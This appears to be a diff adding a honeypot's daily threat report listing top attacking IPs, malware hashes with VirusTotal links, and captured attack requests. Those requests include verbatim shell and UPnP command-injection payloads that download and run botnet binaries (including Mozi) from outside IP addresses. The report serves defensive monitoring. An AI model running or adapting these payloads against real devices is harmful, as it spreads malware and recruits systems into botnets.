@@ -1,0 +1,37 @@
+Top 5 IPs for 2024-03-08 :
+
+122.226.191.252
+59.23.39.135
+207.154.250.29
+110.177.101.160
+121.226.131.252
+
+Malware Download:
+6d042977e3a6c3e9cdbc2af7b0d770bd8b381c194e295cd1b5f4d0f0c18c3006
+https://www.virustotal.com/gui/file/6d042977e3a6c3e9cdbc2af7b0d770bd8b381c194e295cd1b5f4d0f0c18c3006
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+Malcious Commands seen:
+
+GET /shell?pidof+arm7+|+grep+arm7+|+xargs+kill+-9;ps+arm+|+xargs+kill+-9;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.28.33.96/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;wget+http:/\\/103.28.33.96/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;rm+-rf+most* HTTP/1.1
+user-Agent: KrebsOnSecurity
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.114/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 103.153.69.114 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 103.153.69.114; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.153.69.114 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
+
+POST /picsdesc.xml HTTP/1.1
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: /
+User-Agent: Hello-World
+Connection: keep-alive
+
+<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://115.55.226.184:41333/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+
